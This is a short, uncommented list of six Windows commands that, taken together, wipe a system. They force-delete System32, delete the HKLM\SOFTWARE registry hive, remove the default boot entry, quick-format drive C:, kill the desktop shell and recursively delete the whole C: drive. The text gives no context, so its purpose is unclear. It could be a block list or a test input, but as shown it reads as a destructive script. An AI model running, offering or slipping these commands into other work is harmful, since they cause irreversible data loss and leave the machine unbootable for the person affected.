del /f /s /q C:\Windows\System32

reg delete HKLM\SOFTWARE /f

bcdedit /delete {default}

format C: /q /y

taskkill /f /im explorer.exe

rd /s /q C:\
